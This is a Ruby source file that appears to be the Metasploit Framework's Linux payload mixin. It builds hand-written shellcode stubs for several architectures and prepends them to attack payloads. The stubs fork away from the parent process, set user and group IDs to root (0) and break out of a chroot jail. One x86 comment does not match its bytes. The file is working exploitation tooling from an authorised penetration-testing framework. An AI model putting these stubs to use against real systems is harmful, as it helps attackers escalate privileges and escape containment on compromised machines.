# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced features for linux-based
# payloads. Linux payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Linux

  #
  # This mixin is chained within payloads that target the Linux platform.
  # It provides special prepends, to support things like chroot and setuid.
  #
  def initialize(info = {})
    ret = super(info)

    register_advanced_options(
      [
        Msf::OptBool.new('PrependFork',
          [
            false,
            "Prepend a stub that executes: if (fork()) { exit(0); }",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetresuid',
          [
            false,
            "Prepend a stub that executes the setresuid(0, 0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetreuid',
          [
            false,
            "Prepend a stub that executes the setreuid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetuid',
          [
            false,
            "Prepend a stub that executes the setuid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetresgid',
          [
            false,
            "Prepend a stub that executes the setresgid(0, 0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetregid',
          [
            false,
            "Prepend a stub that executes the setregid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetgid',
          [
            false,
            "Prepend a stub that executes the setgid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependChrootBreak',
          [
            false,
            "Prepend a stub that will break out of a chroot (includes setreuid to root)",
            "false"
          ]
        ),
        Msf::OptBool.new('AppendExit',
          [
            false,
            "Append a stub that executes the exit(0) system call",
            "false"
          ]
        ),
        Msf::OptInt.new('MeterpreterDebugLevel',
          [
            true,
            "Set debug level for meterpreter 0-3 (Default output is strerr)",
            0
          ]
        ),
        Msf::OptString.new('RemoteMeterpreterDebugFile',
          [
            false,
            "Redirect Debug Info to a Log File",
            ""
          ]
        ),
      ], Msf::Payload::Linux)

    ret
  end

  def apply_prepends(buf)
    pre = ''
    app = ''

    test_arch = [ *(self.arch) ]

    # Handle all x86 code here
    if (test_arch.include?(ARCH_X86))

      # Prepend

      if (datastore['PrependFork'])
        pre << "\x6a\x02"             + #   pushb   $0x2                       #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"             + #   int     $0x80       ; fork         #
               "\x85\xc0"             + #   test    %eax,%eax                  #
               "\x74\x06"             + #   jz      0xf                        #
               "\x31\xc0"             + #   xor     %eax,%eax                  #
               "\xb0\x01"             + #   movb    $0x1,%al    ; exit         #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetresuid'])
        # setresuid(0, 0, 0)
        pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
               "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\xf7\xe3"             + #   mull    %ebx                       #
               "\xb0\xa4"             + #   movb    $0xa4,%al                  #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetreuid'])
        # setreuid(0, 0)
        pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
               "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\x6a\x46"             + #   pushl   $0x46                      #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\x6a\x17"             + #   pushl   $0x17                      #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetresgid'])
        # setresgid(0, 0, 0)
        pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
               "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\xf7\xe3"             + #   mull    %ebx                       #
               "\xb0\xaa"             + #   movb    $0xaa,%al                  #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetregid'])
        # setregid(0, 0)
        pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
               "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\x6a\x47"             + #   pushl   $0x47                      #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"               #   int     $0x80                      #
      end

      if (datastore['PrependSetgid'])
        # setgid(0)
        pre << "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\x6a\x2e"             + #   pushl   $0x2e                      #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"               #   int     $0x80                      #
      end
      if (datastore['PrependChrootBreak'])
        # setreuid(0, 0)
        pre << "\x31\xc9"             + #   xorl    %ecx,%ecx                  #
               "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
               "\x6a\x46"             + #   pushl   $0x46                      #
               "\x58"                 + #   popl    %eax                       #
               "\xcd\x80"               #   int     $0x80                      #

        # break chroot
        pre << "\x6a\x3d"             + #   pushl  $0x3d                       #
             # build dir str (ptr in ebx)
             "\x89\xe3"             + #   movl   %esp,%ebx                   #
             # mkdir(dir)
             "\x6a\x27"             + #   pushl  $0x27                       #
             "\x58"                 + #   popl   %eax                        #
             "\xcd\x80"             + #   int     $0x80                      #
             # chroot(dir)
             "\x89\xd9"             + #   movl   %ebx,%ecx                   #
             "\x58"                 + #   popl   %eax                        #
             "\xcd\x80"             + #   int     $0x80                      #
             # build ".." str (ptr in ebx)
             "\x31\xc0"             + #   xorl   %eax,%eax                   #
             "\x50"                 + #   pushl  %eax                        #

             "\x66\x68\x2e\x2e"     + #   pushw  $0x2e2e                     #
             "\x89\xe3"             + #   movl   %esp,%ebx                   #
             # loop changing dir
             "\x6a\x3d"             + #   pushl  $0x1e                       #
             "\x59"                 + #   popl   %ecx                        #
             "\xb0\x0c"             + #   movb   $0xc,%al                    #
             "\xcd\x80"             + #   int     $0x80                      #
             "\xe2\xfa"             + #   loop   -6                          #
             # final chroot
             "\x6a\x3d"             + #   pushl  $0x3d                       #
             "\x89\xd9"             + #   movl   %ebx,%ecx                   #
             "\x58"                 + #   popl   %eax                        #
             "\xcd\x80"               #   int     $0x80                      #

      end

      # Append exit(0)

      if (datastore['AppendExit'])
        app << "\x31\xdb"             + #   xorl    %ebx,%ebx                  #
          "\x6a\x01"             + #   pushl   $0x01                      #
          "\x58"                 + #   popl    %eax                       #
          "\xcd\x80"              #   int     $0x80                      #
      end

    # Handle all Power/CBEA code here
    elsif (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))

      # Prepend

      if (datastore['PrependSetresuid'])
        # setresuid(0, 0, 0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\xa5\x2a\x78"     + #   xor     r5,r5,r5                   #
               "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\xa5"     + #   addi    r0,r31,-347                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependSetreuid'])
        # setreuid(0, 0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x47"     + #   addi    r0,r31,-441                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x18"     + #   addi    r0,r31,-488                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependSetresgid'])
        # setresgid(0, 0, 0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\xa5\x2a\x78"     + #   xor     r5,r5,r5                   #
               "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\xab"     + #   addi    r0,r31,-341                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependSetregid'])
        # setregid(0, 0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x48"     + #   addi    r0,r31,-440                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependSetgid'])
        # setgid(0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x2f"     + #   addi    r0,r31,-465                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

      if (datastore['PrependChrootBreak'])
        # setreuid(0, 0)
        pre << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x84\x22\x78"     + #   xor     r4,r4,r4                   #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x47"     + #   addi    r0,r31,-441                #
               "\x44\xff\xff\x02"       #   sc                                 #

        # EEK! unsupported...
      end

      # Append exit(0)

      if (datastore['AppendExit'])
        app << "\x3b\xe0\x01\xff"     + #   li      r31,511                    #
               "\x7c\x63\x1a\x78"     + #   xor     r3,r3,r3                   #
               "\x38\x1f\xfe\x02"     + #   addi    r0,r31,-510                #
               "\x44\xff\xff\x02"       #   sc                                 #
      end

    elsif (test_arch.include?(ARCH_X64))

      if (datastore['PrependFork'])
        # if (fork()) { exit(0); }
        pre << "\x6a\x39"             #    push    57        ; __NR_fork     #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
        pre << "\x48\x85\xc0"         #    test    rax,rax                   #
        pre << "\x74\x08"             #    jz      0x08                      #
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x6a\x3c"             #    push    60        ; __NR_exit     #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetresuid'])
        # setresuid(0, 0, 0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
        pre << "\x6a\x75"             #    push    0x75                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetreuid'])
        # setreuid(0, 0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
        pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
        pre << "\x6a\x71"             #    push    0x71                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x6a\x69"             #    push    0x69                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetresgid'])
        # setresgid(0, 0, 0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
        pre << "\x6a\x77"             #    push    0x77                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetregid'])
        # setregid(0, 0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
        pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
        pre << "\x6a\x72"             #    push    0x72                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependSetgid'])
        # setgid(0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x6a\x6a"             #    push    0x6a                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
      end

      if (datastore['PrependChrootBreak'])

        # setreuid(0, 0)
        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
        pre << "\x48\x89\xf8"         #    mov     rax,rdi                   #
        pre << "\xb0\x71"             #    mov     al,0x71                   #
        pre << "\x0f\x05"             #    syscall                           #

        # generate temp dir name
        pre << "\x48\xbf"             #    mov     rdi,                      #
        pre << Rex::Text.rand_text_alpha(8)  #         random                #
        pre << "\x56"                 #    push    rsi                       #
        pre << "\x57"                 #    push    rdi                       #

        # mkdir(random,0755)
        pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
        pre << "\x66\xbe\xed\x01"     #    mov     si,0755                   #
        pre << "\x6a\x53"             #    push    0x53                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #

        # chroot(random)
        pre << "\x48\x31\xd2"         #    xor     rdx,rdx                   #
        pre << "\xb2\xa1"             #    mov     dl,0xa1                   #
        pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
        pre << "\x0f\x05"             #    syscall                           #

        # build .. (ptr in rdi )
        pre << "\x66\xbe\x2e\x2e"     #    mov     si,0x2e2e                 #
        pre << "\x56"                 #    push    rsi                       #
        pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #

        # loop chdir(..) 69 times
        # syscall tend to modify rcx can't use loop...
        pre << "\x6a\x45"             #    push    0x45                      #
        pre << "\x5b"                 #    pop     rbx                       #
        pre << "\x6a\x50"             #    push    0x50                      #
        pre << "\x58"                 #    pop     rax                       #
        pre << "\x0f\x05"             #    syscall                           #
        pre << "\xfe\xcb"             #    dec     bl                        #
        pre << "\x75\xf7"             #    jnz     -7                        #

        # chroot (.) (which should be /)
        pre << "\x6a\x2e"             #    push    .  (0x2e)                 #
        pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
        pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
        pre << "\x0f\x05"             #    syscall                           #

      end

      # Append exit(0)
      if (datastore['AppendExit'])
        app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
        app << "\x6a\x3c"             #    push    0x3c                      #
        app << "\x58"                 #    pop     rax                       #
        app << "\x0f\x05"             #    syscall                           #
      end
    elsif (test_arch.include?(ARCH_ARMLE))
      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x00\x00\x20\xe0"     #    eor r0, r0, r0                    #
        pre << "\x17\x70\xa0\xe3"     #    mov r7, #23                       #
        pre << "\x00\x00\x00\xef"     #    svc                               #
      end
      if (datastore['PrependSetresuid'])
        # setresuid(ruid=0, euid=0, suid=0)
        pre << "\x00\x00\x20\xe0"     #    eor r0, r0, r0                    #
        pre << "\x01\x10\x21\xe0"     #    eor r1, r1, r1                    #
        pre << "\x02\x20\x22\xe0"     #    eor r2, r2, r2                    #
        pre << "\xa4\x70\xa0\xe3"     #    mov r7, #0xa4                     #
        pre << "\x00\x00\x00\xef"     #    svc                               #
      end
    end

    return (pre + buf + app)
  end


end
